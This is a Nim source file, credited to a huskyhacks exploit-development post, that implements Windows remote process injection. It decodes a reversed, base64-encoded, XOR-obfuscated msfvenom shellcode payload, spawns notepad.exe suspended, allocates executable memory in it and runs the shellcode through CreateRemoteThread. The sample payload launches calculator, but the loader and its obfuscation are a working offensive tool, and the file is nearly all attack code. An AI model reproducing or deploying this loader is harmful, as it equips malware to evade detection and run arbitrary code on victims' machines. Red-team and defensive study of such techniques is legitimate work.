#[
    Credit: https://huskyhacks.dev/2021/07/17/nim-exploit-dev/
    Process injection by huskyhacks
]#

import algorithm
import base64
import sequtils
import strutils

import osproc
import strformat
import winim
import winim/lean

proc unXor[I,T](xoredBuf: array[I,T], key: byte): array[I, T] =
    var sc: array[xoredBuf.len, byte]
    for i in low(xoredBuf) .. high(xoredBuf):
        sc[i] = xoredBuf[i] xor key

    return sc

proc inject[I, T](shellcode: array[I, T]): void =
    let injectedProcess = startProcess("notepad.exe")
    injectedProcess.suspend()
    echo &"[+] Suspended Process: {injectedProcess.processID}"

    let procHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        cast[DWORD](injectedProcess.processID)
    )
    echo &"[+] Injected process handle: {procHandle}"

    let memPointer = VirtualAllocEx(
        procHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let writeProcess = WriteProcessMemory(
        procHandle,
        memPointer,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    echo &"[+] WriteProcessMemory: {bool(writeProcess)}"
    echo &"    Bytes written:      {bytesWritten}"

    let thHandle = CreateRemoteThread(
        procHandle,
        NULL, 
        0,
        cast[LPTHREAD_START_ROUTINE](memPointer),
        NULL, 
        0,
        NULL
    )

    echo &"[+] Thread Handle: {thHandle}"

when isMainModule:

    # msfvenom -p windows/x64/exec CMD="C:\Windows\System32\Calc.exe" -f py
    var payload:string = "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"

    # reverse, b64decode, then parse from hex to int
    var buf = decode(payload.reversed.join).split(",").map(proc (j:string): string = strip(j)).map(parseHexInt)
    let key = 0x69

    # Convert buffer from sequence to byte array; need to know len of array (hardcoded)
    var buf2: array[2452, byte]
    for i in low(buf) .. high(buf):
        buf2[i] = buf[i].byte

    let sc = unXor(buf2, key.byte)
    inject(sc)